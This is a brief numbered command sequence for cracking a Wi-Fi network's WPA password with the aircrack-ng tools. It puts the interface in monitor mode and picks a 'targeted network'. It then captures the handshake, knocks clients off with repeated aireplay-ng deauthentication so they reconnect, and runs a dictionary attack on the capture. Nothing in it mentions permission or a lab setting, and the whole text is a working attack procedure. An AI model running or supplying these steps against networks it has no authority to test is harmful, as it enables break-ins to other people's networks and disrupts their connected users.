1) Install aircrack-ng:
	sudo apt-get install aircrack-ng

2) Find the wifi interface:
	sudo apt install net-tools
	ifconfig (or iwconfig)

i.e: "wlp2s0"

3) Set the wifi interface in monitor mode:
	sudo airmon-ng start <wifi interface name>

It should be enabled as "<wifi interface name>mon"
i.e: "wlp2s0mon"

4) List all available wifi networks
	sudo airodump-ng wlp2s0mon

5) Copy bssid of the targeted network

6) Capture the handshake 
	sudo airodump-ng --bssid <targeted bssid> -c <channel> -w <file to write> <interface name>

7) Test if the handshake was found
	sudo aircrack-ng <file name>-01.cap
If it says something like "0 handshake" continue with the next step.

8) Deauthorize the client so it reconnects with the handshake
	sudo aireplay-ng --deauth 10 -a <target bssid> <interface name> --ignore-negative-one

9) Repeat 7) and 8) until handshake is found

10) Stop all running task
	sudo airmon-ng stop <interface name>

11) Apply dictionary attack
	sudo aircrack-ng <capture file name> -w <passwords file>

12) Done.
